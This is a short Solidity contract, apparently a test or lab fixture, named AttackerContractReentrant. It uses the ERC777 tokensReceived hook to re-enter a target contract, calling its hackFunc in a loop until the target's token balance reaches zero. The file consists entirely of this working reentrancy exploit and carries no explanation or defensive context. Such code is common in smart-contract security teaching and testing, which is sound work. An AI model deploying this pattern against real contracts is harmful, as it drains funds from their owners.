// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";

interface IContractToHack {
    function getTokenBalance() external view returns (uint256);

    function hackFunc() external;
}

contract AttackerContractReentrant is IERC777Recipient {
    IContractToHack _contractToHack;

    constructor(address contractToHack) {
        _contractToHack = IContractToHack(contractToHack);
    }

    function tokensReceived(
        address /*operator*/,
        address from,
        address /*to*/,
        uint256 /*amount*/,
        bytes calldata /*userData*/,
        bytes calldata /*operatorData*/
    ) external override {
        // reentrancy into contractToHack initiated here
        // _balances[from] += amount;
        if (from == address(_contractToHack)) {
            while (_contractToHack.getTokenBalance() > 0)
                _contractToHack.hackFunc();
        }
    }
}
